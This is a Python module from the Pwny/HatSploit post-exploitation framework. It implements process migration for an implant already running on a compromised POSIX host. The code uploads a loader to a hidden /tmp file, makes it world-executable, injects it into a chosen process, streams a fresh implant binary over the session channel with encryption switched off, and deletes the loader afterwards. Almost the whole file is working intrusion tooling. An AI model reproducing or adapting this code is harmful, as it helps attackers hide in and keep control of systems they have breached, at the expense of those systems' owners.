"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import time
import struct

from .__main__ import Pwny

from pwny.api import *
from pwny.types import *

from badges import Badges
from pex.string import String

from hatsploit.lib.core.session import Session


class Migrate(Badges):
    """ Subclass of pwny module.

    This subclass of pwny module is intended for providing a
    tools for migration.
    """

    def __init__(self, session: Session) -> None:
        """ Initialize migration for session.

        :param Session session: session to migrate
        :return None: None
        """

        self.session = session

    def migrate_posix(self, pid: int) -> None:
        """ Migrate to the specific PID if running POSIX system.
        (e.g. Linux, macOS)

        :param int pid: process ID
        :return None: None
        :raises RuntimeError: with trailing error message
        """

        self.print_process(f"Migrating to {str(pid)}...")

        loader_path = '/tmp/.' + String().random_string(8)
        tib_path = (self.session.pwny_tibs +
                    str(self.session.info['Platform']) +
                    '/' + str(self.session.info['Arch']) +
                    '/loader')

        if os.path.exists(tib_path):
            with open(tib_path, 'rb') as f:
                data = f.read()

                self.print_process(f"Uploading TIB ({str(len(data))} bytes)...")
                self.session.upload(tib_path, loader_path)

                tlv = self.session.send_command(
                    tag=FS_CHMOD,
                    args={
                        TLV_TYPE_PATH: loader_path,
                        FS_TYPE_MODE: 777
                    }
                )

                if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                    self.session.send_command(
                        tag=FS_FILE_DELETE,
                        args={
                            TLV_TYPE_PATH: loader_path
                        }
                    )

                    raise RuntimeError("Failed to upload TIB!")

                self.print_process(f"Injecting TIB to {str(pid)}...")
                tlv = self.session.send_command(
                    tag=PROCESS_MIGRATE,
                    args={
                        TLV_TYPE_PID: pid,
                        TLV_TYPE_MIGRATE: loader_path
                    }
                )

                if tlv.get_int(TLV_TYPE_STATUS) != TLV_STATUS_QUIT:
                    self.session.send_command(
                        tag=FS_FILE_DELETE,
                        args={
                            TLV_TYPE_PATH: loader_path
                        }
                    )

                    raise RuntimeError(f"Failed to migrate to {str(pid)}!")

                implant = Pwny(
                    target='x86_64-linux-musl').to_binary('bin')

                self.print_process(f"Sending implant ({str(len(implant))} bytes)...")
                self.session.channel.client.send_raw(struct.pack('!I', len(implant)))
                self.session.channel.client.send_raw(implant)

                self.print_process("Waiting for the implant...")
                self.session.open(self.session.channel.client)
                self.session.channel.secure = False

                self.print_process("Cleaning up...")
                self.session.send_command(
                    tag=FS_FILE_DELETE,
                    args={
                        TLV_TYPE_PATH: loader_path
                    }
                )
        else:
            raise RuntimeError(f"TIB was not found for {platform}/{arch}!")

        self.print_success(f"Successfully migrated to {str(pid)}")
